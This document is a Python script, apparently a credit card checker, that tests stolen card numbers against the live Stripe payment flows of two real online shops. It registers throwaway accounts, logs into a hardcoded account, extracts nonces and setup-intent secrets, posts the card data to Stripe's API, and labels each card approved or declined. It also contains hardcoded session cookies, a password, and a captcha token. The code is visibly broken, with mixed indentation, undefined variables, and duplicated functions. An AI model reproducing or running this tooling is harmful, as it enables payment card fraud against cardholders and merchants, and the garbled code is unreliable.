import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests
    
def find_between(s, start, end):
    start_index = s.find(start)
    if start_index == -1:
        return ""
    start_index += len(start)
    end_index = s.find(end, start_index)
    if end_index == -1:
        return ""
    return s[start_index:end_index]


def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
		
	user = user_agent.generate_user_agent()
		
	r = requests.session()
	
	r.follow_redirects = True
	
	r.verify = False


		
	def generate_full_name():
				first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
			                   "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan",
			                   "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa",
			                   "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha",
			                   "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada",
			                   "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar",
			                   "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia",
			                   "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem",
			                   "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia",
			                   "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"] # List of first names
			    
				last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown",
			                   "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White",
			                   "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar",
			                   "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera",
			                   "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza",
			                   "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard",
			                   "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell",
			                   "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"] # List of last names
			    
				full_name = random.choice(first_names) + " " + random.choice(last_names)
				first_name, last_name = full_name.split()

				return first_name, last_name
			
	def generate_address():
		cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix", "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"]
		states = ["NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA"]
		streets = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave", "Elm St", "Washington St", "Lake St", "Hill St", "Maple St"]
		zip_codes = ["10001", "90001", "60601", "77001", "85001", "19101", "78201", "92101", "75201", "95101"]

		city = random.choice(cities)
		state = states[cities.index(city)]
		street_address = str(random.randint(1, 999)) + " " + random.choice(streets)
		zip_code = zip_codes[states.index(state)]

		return city, state, street_address, zip_code
			
			# Testing the library:
	first_name, last_name = generate_full_name()
	city, state, street_address, zip_code = generate_address()
			
			
			
			
			
	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
				
		return f"{name}{number}@gmail.com"
	acc = (generate_random_account())
			
		
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
				
		return f"{name}{number}"
	username = (username())
			
			
			
	def num():
		number = ''.join(random.choices(string.digits, k=7))
		return f"303{number}"
	num = (num())
			
			
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
			
	corr = generate_random_code()
			
	sess = generate_random_code()
			
		
	headers = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'Accept-Language': 'en-US,en;q=0.9',
     'Cache-Control': 'max-age=0',
     'Connection': 'keep-alive',
     # 'Cookie': '_hjSessionUser_1137759=eyJpZCI6ImY5YjM5ZWQwLTM2NzgtNTRkOS1hMjVjLTdkNmU1ZmM2M2JjZCIsImNyZWF0ZWQiOjE3MjI5NDQ5MTg1MTMsImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=a62dbe59-3b11-4b12-b96f-eefd43866b515720f1; _hjSession_1137759=eyJpZCI6ImU1YzVlZTFjLWM2NzktNGFmMC1iZDQ5LTkyNzk2Y2ZhNzc3NyIsImMiOjE3MjM4ODE5ODE4MTgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _gid=GA1.2.1731738201.1723881982; wordpress_test_cookie=WP%20Cookie%20check; _gat_UA-132327897-1=1; _ga_DZW0LEB94E=GS1.1.1723881981.4.1.1723882755.0.0.0; _ga=GA1.1.1439092414.1722944919',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-Site': 'none',
     'Sec-Fetch-User': '?1',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': user,
     'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
    }

    response = requests.get('https://shopzone.nz/my-account/add-payment-method/')
    
    regnon = find_between(response.text,'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="','"')
    
	headers = {
     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'Accept-Language': 'en-US,en;q=0.9',
     'Cache-Control': 'max-age=0',
     'Connection': 'keep-alive',
     'Content-Type': 'application/x-www-form-urlencoded',
     # 'Cookie': '_hjSessionUser_1137759=eyJpZCI6ImY5YjM5ZWQwLTM2NzgtNTRkOS1hMjVjLTdkNmU1ZmM2M2JjZCIsImNyZWF0ZWQiOjE3MjI5NDQ5MTg1MTMsImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=a62dbe59-3b11-4b12-b96f-eefd43866b515720f1; _hjSession_1137759=eyJpZCI6ImU1YzVlZTFjLWM2NzktNGFmMC1iZDQ5LTkyNzk2Y2ZhNzc3NyIsImMiOjE3MjM4ODE5ODE4MTgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _gid=GA1.2.1731738201.1723881982; wordpress_test_cookie=WP%20Cookie%20check; _ga=GA1.2.1439092414.1722944919; _ga_DZW0LEB94E=GS1.1.1723881981.4.1.1723882869.0.0.0',
     'Origin': 'https://shopzone.nz',
     'Referer': 'https://shopzone.nz/my-account/add-payment-method/',
     'Sec-Fetch-Dest': 'document',
     'Sec-Fetch-Mode': 'navigate',
     'Sec-Fetch-Site': 'same-origin',
     'Sec-Fetch-User': '?1',
     'Upgrade-Insecure-Requests': '1',
     'User-Agent': user,
     'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
    }  

    data = {
     'email': acc,
     'woocommerce-register-nonce': regnon,
     '_wp_http_referer': '/my-account/add-payment-method/',
     'register': 'Register',
    }

    response = requests.post('https://shopzone.nz/my-account/add-payment-method/', headers=headers, data=data)
	
    headers = {
     'Accept': 'application/json, text/javascript, */*; q=0.01',
     'Accept-Language': 'en-US,en;q=0.9',
     'Connection': 'keep-alive',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     # 'Cookie': '_hjSessionUser_1137759=eyJpZCI6ImY5YjM5ZWQwLTM2NzgtNTRkOS1hMjVjLTdkNmU1ZmM2M2JjZCIsImNyZWF0ZWQiOjE3MjI5NDQ5MTg1MTMsImV4aXN0aW5nIjp0cnVlfQ==; __stripe_mid=a62dbe59-3b11-4b12-b96f-eefd43866b515720f1; _hjSession_1137759=eyJpZCI6ImU1YzVlZTFjLWM2NzktNGFmMC1iZDQ5LTkyNzk2Y2ZhNzc3NyIsImMiOjE3MjM4ODE5ODE4MTgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MH0=; _gid=GA1.2.1731738201.1723881982; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_e24c14281bf0bd969c57ac5f2487be7e=carbbg123%7C1725092469%7CmgYLDXZH4IEMyHfSUxNiDNkbat6lWjR0Iw8zSIFpcB6%7C22acf6d35c96c7e21f7d64f0e7b5760a03d285ead70624c9432caa8dc49f369f; _ga_DZW0LEB94E=GS1.1.1723881981.4.1.1723882871.0.0.0; _ga=GA1.2.1439092414.1722944919; _gat_UA-132327897-1=1',
     'Origin': 'https://shopzone.nz',
     'Referer': 'https://shopzone.nz/my-account/add-payment-method/',
     'Sec-Fetch-Dest': 'empty',
     'Sec-Fetch-Mode': 'cors',
     'Sec-Fetch-Site': 'same-origin',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
     'X-Requested-With': 'XMLHttpRequest',
     'X-WP-Nonce': '30618f3cd5',
     'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
    }

    data = {
    'payment_method': 'stripe_cc',
    }

    response = requests.post(
    'https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent',
    headers=headers,
    data=data,
    )
    
    full = find_between(response.text,'"client_secret": "','"')
    half = find_between(response.text,'"client_secret": "','_secret_')
    
    url = "https://m.stripe.com/6"
    response = requests.get(url)
    muid = find_between(response.text,'{"muid":"','"')
    guid = find_between(response.text,'"guid":"','"')
    sid = find_between(response.text,'"sid":"','"')
    
    confirm_response = requests.post(
    f"https://api.stripe.com/v1/setup_intents/{half}/confirm",
    data={
        "payment_method_data[type]": "card",
        "payment_method_data[card][number]": n,
        "payment_method_data[card][cvc]": cvc,
        "payment_method_data[card][exp_month]": mm,
        "payment_method_data[card][exp_year]": yy,
        "payment_method_data[billing_details][address][postal_code]": "10080",
        "payment_method_data[guid]": guid,
        "payment_method_data[muid]": muid,
        "payment_method_data[sid]": sid,
        #"payment_method_data[referrer]": "https://contabo.com",
        "expected_payment_method_type": "card",
        "use_stripe_sdk": "true",
        "key": "pk_live_51LPHnuAPNhSDWD7S7BcyuFczoPvly21Beb58T0NLyxZctbTMscpsqkAMCAUVd37qe4jAXCWSKCGqZOLO88lMAYBD00VBQbfSTm",
        "client_secret": full
    },
    headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    )

    confirm_response.text = confirm_response
    
    decline_code = find_between(confirm_response.text,'','')
    code = find_between(confirm_response.text,'','')
    message = find_between(confirm_response.text,'','')

		
	pattern = r'Status code (.*?)\s*</li>'
		
    if '"status": "succeeded"' in confirm_response.text:
        result = "Approved"
    else:
		return result
def sq(card):
	return 'Your card was declined.'
	
#Strip CH	
	
def stripe(ccx):
	import requests
		ccx = y.strip().split('\n')[0]
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	acc = ['medjdjdj882ro@gmail.com','merospam00@gmail.com','mero00spam00@gmail.com','mero00spam00@gmail.com']
	time.sleep(9)
	email = random.choice(acc)
	print(F+email)
	user = user_agent.generate_user_agent()
	r = requests.session()
	headers = {'user-agent': user}
	response = r.post(
	    'https://thefloordepot.com.au/my-account/add-payment-method/', headers=headers)
	nonce = (re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text).group(1))
	data = {
    'username': email,
    'password': 'A@Amir5520055',
    'woocommerce-login-nonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'login': 'Log in',
}

	response = r.post(
	    'https://thefloordepot.com.au/my-account/add-payment-method/',
	    cookies=r.cookies,
	    headers=headers,
	    data=data,
	)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	time.sleep(9)
	headers = {'user-agent': user}
	data = f'type=card&owner[name]=+&owner[email]={email}&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=fd6c82e4-dc3a-45f0-94f6-fd9a4e71ba50e29d22&muid=f3e26d94-2e55-4062-b4f0-19f14192506a71c920&sid=c11f9c06-17e1-4ae9-a386-e4af1a2eab4672a908&pasted_fields=number&payment_user_agent=stripe.js%2Fddbd33ac04%3B+stripe-js-v3%2Fddbd33ac04%3B+split-card-element&referrer=https%3A%2F%2Fthefloordepot.com.au&time_on_page=20013&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiN1dzWGtGNEE3WTBob0ExcUJJRDVFd0IrR0VabUQzaGJVcGxrK3o5NTRQZFNxaDNDU0ptaFFBelB0YWlSME5RMnIvWFFtdDloaG1GcWZ6S2ZkbU92bEpIaEVVaXgxVm03alUwUE9QOXBLaEJpYU1HbVhENDB0b1BlQm1QcFNUbzEzbm8xd1Q2MWFvUGNjd2ZXRmhXTUdqZmUvVDJvalJrS1VlQVhHMlk4YXJtQXhvYmo4NmUydld4RU9VUmJWQWRXSFQzaUo0QktwbEZ4eUVYaCtnQjUyZWdrOUV0by8rbXNiRWVXamxad2RzZGtkRUdKZVlQdGdwYmNuYkZhcU5DeWV1c2ptZG1EQ0xTL3JqS1k0VGVWdTNOQ0RPTjJWU0VFczkyME9PRFliU01aWjh3OGxZK25QSVBWRFpBU3N3bndIRVhEcEtUeE9mT0hWRW5JZzdOUCtNOXhUV1V0dHZYYWhvWEdxUFJBSlpiL2xYZlQ2blFIWUpnZEJrNmcrVVVtUEZ5Y3Q1d1lCZHd0dEljbjFPQ2hUOHpraklpVlJWaDd6SjBXUjJFOE12S09lNDIxTVZIRW4zQUUybjZJR2toTVYxZVJBK1VaSWRuaHNYamw4WTRWaHMyMXFBell6bE9iQ3k1cnE3R3VUWEIzUHo2SzZZYWswQnFFcjczdUdnb1o0U25JQVlyMlhTdGhkZjhWSWNYSzRLNnVRbGwrSGN4Y0xQZXM1NUZXYjJHZFdWU1RUSWRROEJYMXZyRnBiOVIxS3NYV0ZCRm1jcFM3VG1kRC9lZW9tL0tTT2R5aktyZHZiVWlPVlVwNmg1UEc2VWVsU2JBdGtaeEk2enR0aG5QZVBCM1BsSGZwRWhCNGxLQ0VQcDNDY1F6SUM3Qll1dE5HcTdLcGpSRm15S0RwNWFxWTZCUlhDKzJjYWNVNVpmWGVXdkZ6R1k5VmN5VEN2ZjBPb0pxZXBzUkFQZi83RnVqNWxCbkYwNW5OL2RFSllUVklHTDdDM0RlMmNHUkxrTjVHdGdwbnBMaVVwbkk2a0x4U0RCNlNiZnU4SXY4NnJlSTNiTDd3MVBDWmV3bXdhN2hheFNZalNQeWQ4YlYzdTVYQk82V0NORGZHbmV6NS9KMlVDRzdDbHdpREpDM3Q0Z0MxalI4ZVpxbTBTRGtweTkwdkZWNFlFaVRuQ1BpZnZmQUNybEcrWVBDb2doM0I2YnNOSksvTnRhZU9GQnBwOVhhdkEvbkRobWU1QUtvNFoxS0tEU1B0WVZTOWhhd0tQM21mL0NuSkJBQktENnBVUGwvWDdGQzJjWTFkYUMrMk5SdUxPZHYzQmNIc0pONzVnallWUFBOSzhkZ2JvS0hYMU15cWp0VityMlc1VnhyallUZWNoVHk5dzYwcldTc29QMjBBT0ZEK3NGenh0RHZtcFRvLzNqdjFzVGx2Rm5CbWVUcUNYNDBTcFVZQzdRcmZONlh6enk4MjdFSExBRzVTMGk5d2hLOGQ2U1RJaWMwanNEdE52NUVUcEVPa0hPS1lmMm02alVIcnMxSWlBcElSNHhlRHc4dUNzLzJ4TDNTYTcxYStiK1FVc040MWFyaHEvOTY1aDJKNGZualRoOXhuZld5ZUJXc3YzY0RLdnpBYU5GNXBtd2djTEJLcEpUYlhaWHE3M0xhVkxMR25JeEJ3bTBCQ1Z3d2JESjhIY1hxWXlwSDNiV2U3WVFhN3RES2xFOGxQdVFCL1p0UHhtVnlLSFhGQTRLK0o4MitUdzZzSnd2MjRXZDY2dWdrREJobGY0SUNHN0QyNkxiUmt5YWhYVTBaNlhQZlVyT0FDeXdBSTJ1bUMzT2F1L0huUXVFSXBxeVUxSGRyMFJwMGRBYkZ1ZFdzaTZIOTdoVVZ6NVRTS04vcitQUTVweU1KbVh4K3p2ZkVITTFxZzZLeUoxcVZyaUxFWDFZQnYwYmdxT0YrYlpkb1BnOGprMG5IYkYvYUVZK0VPL1ZVb00wcHdwN0o0QmdWSThteUZiQmFheFd1eHdZaXBwU2VVY3JScDlmK052dVVaOUtvLzNDNjh0dWd3THdKVUo1cTZjWmFqSGs3akNNV2Yzcm5JdzlpSEJ4bG02SUd6SDFiOVZMWExMOGFvM2VHVHY1VHFtKzFrQXkzZ3BxTmlyMDJGQXNUU2xoUTF1TWRUci9SQU8xeDhiQTFCbTFXdmFFZW0xOXQvTzRhaFRza1hXemJuUWJySGdsWW5ORDZUcS9PS3ZLQkxYY1V4TitwUmF6QXhXOXVwUGU5RnJwcW1VN040eGMzV3RLS1EvVDFycjBDZU5BcG1MRll3TnNxRDhXUVNkdGw3SEJpdVFUM0dJSUVVQzN1eEo5djhheW50OWJnQkVQNHV5MEJCK2xYWkhaWllhTnlXS1JLS3NHdFk2Q1grZnNMMzhOZktzVXhaa2pLSEw4RFpoSTZJR3ZFbzZ5eUNYcDRhTis0TmhPMHNyeXlteHBibGwxdEZ3aGxON1NwWWZuV216d1V0UHp5dlVoRFhRbTVFdWplb055TmVQZGMvdks1NEJqR2tOVFZKOE9kTThDbEJpdWRHVXptOGFYVHA5dFpLOWtVWHpoYm4wRGhkZHRWeHYyWTFqREZtak1EbFI5QXNlTzhBck9mbGVhTWRDMEt1WnAzYlIzNS92MlFLdVNSNFUxTXhvMDh6R04wdWNFZVpTMFBZalltU0dNaGsxNDlvdEswTEdKM2o3U1gwbFlGakFENVFjWm4yVUpvQTNLdUhwaWRvc3VyT29NeU9kdXBFMDN5c1pKZ25pUTZ5L1FrNitJUTVvaW9nMVJrPSIsImV4cCI6MTcyNDU4MDc4NCwic2hhcmRfaWQiOjUzNTc2NTU5LCJrciI6IjI1NjNlN2I1IiwicGQiOjAsImNkYXRhIjoianVaOHFkUjFCTTRKbmxWYk1zZ3IrdDd1SFBPSjJSRWZTeDBUUnZwczVrUzJscWJFZXBJTTgxa1d2UndlWVp2QjNaNTQ1elk3c2lwa0hraXRkLzduRFBPOTFZRFY2MTZQU0s4c3k0L2YyWnRjZ0RvVzFnRmFDL05KcEp3QXNJbGU0TnBFUkg2cVBUVmppaEVUTytjY0xrYmJSN3N5d2d1Zjd1SlVIY1RySGhzUW1sMURTU2p6Z0JlQmw3cXNCa2w4aWMxWldrT3pEL2tFY0IxNCJ9.eYslvansSLiqSPUBQ80pqqiQXbk7QTS3nlOK8EDxQxA&key=pk_live_51Hu8AnJt97umck43lG2FZIoccDHjdEFJ6EAa2V5KAZRsJXbZA7CznDILpkCL2BB753qW7yGzeFKaN77HBUkHmOKD00X2rm0Tkq'
	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)
	if not 'id' in response.json():
	   print('ERORR CARD')
	else:
		id=response.json()['id']

	headers = {'user-agent': user}
	
	params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}
	data = {
    'stripe_source_id': id,
    'nonce': nonce,
}
	
	r3 = r.post(
	    'https://thefloordepot.com.au/',
	    params=params,
	    headers=headers,
	    data=data,
	)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"id":10486458,"address":"9350 N Central Expy","name":"yusuf","country":"US","vat":null,"billing_account_id":10486458,"last4":"9305","orderReference":"nljannd","user_id":11296645,"organization_id":10807386,"hours":0,"balance_increase_in_cents":null,"payment_method_id":"pm_1PLSN5KEzvleW5flaDzdyat6","transcription_id":null,"plan":"pro_2023_05_01","order_id":null,"recurrence_interval":"month","extra_plan_hours":null}'
#response = requests.post('https://www.happyscribe.com/api/iv1/confirm_payment', cookies=cookies, headers=headers, data=data)
	
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in r3:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in r3 or 'Payment method successfully added.' in r3:
			result = "1000: Approved"
		else:
			result = "Error"
	
		if 'avs' in result or 'suceded' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result or 'Invalid postal code' in result or 'succeeded' in result:
			return 'Approved'
	else:
		return result
def sq(card):
	return 'Your card was declined.'
	
	
	
	